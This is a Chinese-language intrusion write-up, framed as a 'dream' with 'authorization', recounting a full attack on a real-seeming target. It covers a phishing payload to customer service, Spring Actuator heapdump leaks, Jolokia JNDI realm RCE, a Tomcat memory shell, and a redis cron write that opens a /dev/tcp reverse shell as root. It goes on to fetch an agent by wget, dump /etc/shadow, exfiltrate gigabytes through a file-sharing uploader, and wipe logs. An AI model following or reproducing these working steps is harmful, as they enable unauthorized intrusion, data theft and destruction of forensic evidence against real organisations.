0x00 前⾔
如有技术交流或渗透测试/代码审计/红队⽅向培训/红蓝对抗评估需求的朋友
欢迎联系QQ/VX-547006660
前两天在国企的朋友遇到了⼀个棘⼿的靶标，听说之前没⼈能从外⽹打点进去，只能靠万⾥防⽕墙取证
我⼀听来了兴趣，在梦中臆造了⼀个靶场进⾏渗透，并且该梦境已获得相关授权
还请各位看官请勿对号⼊座，如有雷同，纯属巧合
0x01 钓⻥打点
官⽹发现了客服联系⽅式
通过修改 shellcode特征的CS + 免杀加载器，直接做出免杀
。
改后缀名为⾮exe(懂的都懂)，直接⽤话术钓⻥客服(现在客服都聪明了，直接exe是肯定钓不到的)，获得其桌⾯记
事本
记事本中翻出来了后台地址，但是并没有账号密码(有也没有⽤，因为有Google验证码)
http://xxxxx/xxxxx-admin/
0x02 FUZZ得到Spring Actuator泄露，并分析信息
FUZZ了⼀下，出了⼆级⽬录Spring Actuator的泄露
http://xxxxx/xxxxx-admin/actuator/
发现了⽼朋友jolokia
jolokia组件，熟悉Spring测试的兄弟都知道，不出意外可以直接秒~
⼜访问了⼏个常⻅的端点
http://xxxxx/xxxxx-admin/actuator/env
通过env端点可知，该后台托管在亚⻢逊云，并且没有泄露ak，sk等信息
翻来覆去，只看到有个redis的密码
看了下beans端点，并没有找到能⽤来直接dump出星号密码的合适Mbean，所以放弃直接通过jolokia调⽤
mbean获取明⽂
http://xxxxx/xxxxx-admin/actuator/heapdump
通过下载heapdump，进⼊Mat分析
select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains("password"))
调试后发现redis配置的链接地址是127.0.0.1，密码为空，但是并没有开放端⼝外链，那只能先留着了
0x03 Jolokia Realm JNDI注⼊ rce
https://xxxx/xxxxx-admin/actuator/jolokia/
根据得到jolokia端点
直接RCE打试试
利⽤条件为：
⽬标⽹站/jolokia/list 接⼝存在 type=MBeanFactory 和 createJNDIRealm 关键词 
请求可出外⽹ 
命令编码地址：http://www.jackson-t.ca/runtime-exec-payloads.html 
编码反弹Shell的命令
⽤JNDI-Injection-Exploit直接起个恶意Rmi服务
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "command" -A vps_ip
直接修改好脚本
https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jnd
i-rce.py
运⽓不错，⽬标出⽹，直接秒了
www权限
0x04反弹shell后的取证
history，last、hosts，中间件⽇志等常规取证就不说了
⽬标的运维还是⽐较谨慎的，没有直连，⽽是以⼀台亚⻢逊云的主机为跳板进⾏SSH链接
进程看了⼀下，web程序⽤的是MVC架构
0x05 注⼊内存
为了防⽌反弹的Shell随时GG，所以选择注个内存⻢到Tomcat
⽐较恶⼼的是⽬标⽤的MVC架构，路由默认都是直接302跳转后台的路由，导致不少内存⻢没法直接⽤，时间紧
急，去Git翻了⼀个
https://github.com/WisteriaTiger/JundeadShell
直接受控机梭哈
挂上Burp访问靶标，找到了个不302跳转的接⼝，加上密码，访问内存⻢成功
0x06 借⽤redis权限提升
⽬标为www权限，⽽且⽤的亚⻢逊云，及时打了补丁，最近的番号pkexec，dirty pipe等测试后不好使，脏⽜等⽼
古董更不⾏
GUID，SUID查了⼀遍，没有误配
最后都快放弃的时候看了⼀眼进程，redis是以root权限运⾏的...天助我也
wget x.x.x.x:50000/agent_starter.jar
nohup java -jar agent_starter.jar "java_process_name" 8 &
直接通过端⼝转发程序把redis的端⼝转发到本地
利⽤redis写计划任务
（PS:Ubuntu下会因为夹杂了脏数据导致语法⽆法识别⽽任务失效；但对于centos系统则没有影响，可以成功被利
⽤，靶标为centos）
nc监听本地，没过⼀会，root权限的shell就弹回来了
echo -e "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/xx.xx.xx.xx/4444 0>&1\n\n"|redis-cli 
-h xx.xx.xx.xx -x set 1 #设定值
redis-cli -h xx.xx.xx.xx config set dir /var/spool/cron/
redis-cli -h xx.xx.xx.xx config set dbfilename root
redis-cli -h xx.xx.xx.xx save
随后⼜把shadow导出，取证了root⽤户⽬录下的部分东⻄，做了部分权限维持
0x07 ⽂件取证资料回传
把取证好的⽹站Jar包，⽬录⽇志，登陆⽇志打包好，⾜⾜有⼏个G，回传⽂件成了难事
尝试了nc，后⻔回传等均不稳定中途回传断掉，⾃⼰的oss那时候也过期了，没法通过oss回传，难受的⼀逼..
tar -cvf xxxx.tar *
最终问了下⼩圈⾥的师傅，提供了⼀个好⽤的思路
利⽤奶⽜快传回传⽂件
https://github.com/Mikubill/cowtransfer-uploader
速度很舒服，⼤概上传速度能到每秒6M
随后直接去⾃⼰的奶⽜快传下载即可
0x08 资料分析
把回传回来的jar包反编译，取证其中的数据库链接信息，等待下步指示
nohup ./cowtransfer-uploader -c "remember-mev2=...;" -a "" xxx.tar
分析程序记录的Log⽇志，后台登陆信息、账号、登陆IP尽收眼底；站在暗处的违法分⼦命不久矣
0x09 擦屁股与后⾔
随后把web当⽇⽇志，history，/var/log下的⽇志全部清理⼲净
⽤到的⼯具全部wipe删掉
断掉shell链接的⼀瞬间，我醒了，发现这⼀切竟是我在做梦